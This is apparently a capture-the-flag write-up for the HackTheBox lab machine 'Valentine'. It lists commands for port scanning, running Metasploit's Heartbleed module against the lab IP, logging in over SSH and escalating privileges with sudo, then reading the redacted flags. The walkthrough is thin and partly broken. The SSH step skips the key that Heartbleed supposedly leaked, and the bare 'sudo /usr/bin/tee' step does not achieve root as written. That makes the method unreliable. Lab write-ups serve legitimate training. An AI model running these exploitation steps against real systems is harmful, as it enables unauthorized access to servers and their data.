# HackTheBox - Valentine

## Challenge Information

| Field | Value |
|-------|-------|
| **Platform** | HackTheBox |
| **Challenge Name** | Valentine |
| **Category** | Linux Exploitation |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Author** | ch4p |
| **Date Completed** | 2025-08-23 |

## Objective 🎯

Valentine is a Linux machine with a vulnerable service. The goal is to exploit the vulnerability to gain system access and obtain both user and root flags. Heartbleed exploitation! ❤️

## Initial Reconnaissance

### Target Information
- **IP Address**: 10.10.10.79
- **OS**: Linux
- **Services**: SSH, HTTP, HTTPS

### Tools Used
- Nmap
- Heartbleed exploit
- SSH

### Commands/Steps
```bash
nmap -sC -sV 10.10.10.79
```

## Methodology

### Step 1: Port Scan
```bash
nmap -sC -sV 10.10.10.79
```

### Step 2: Heartbleed Exploitation
```bash
msfconsole
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 10.10.10.79
run
```

### Step 3: SSH Access
```bash
ssh hype@10.10.10.79
```

### Step 4: Privilege Escalation
```bash
sudo -l
sudo /usr/bin/tee
```

### Step 5: Find Flags
```bash
cat /home/hype/user.txt
cat /root/root.txt
```

## Solution

### Final Answer
- **User Flag**: [REDACTED]
- **Root Flag**: [REDACTED]

## Key Learnings

- Heartbleed vulnerability exploitation
- SSL/TLS security issues
- SSH key extraction
- Sudo privilege escalation

## Tags

`#hackthebox` `#linux` `#heartbleed` `#ssl` `#ssh` `#easy`
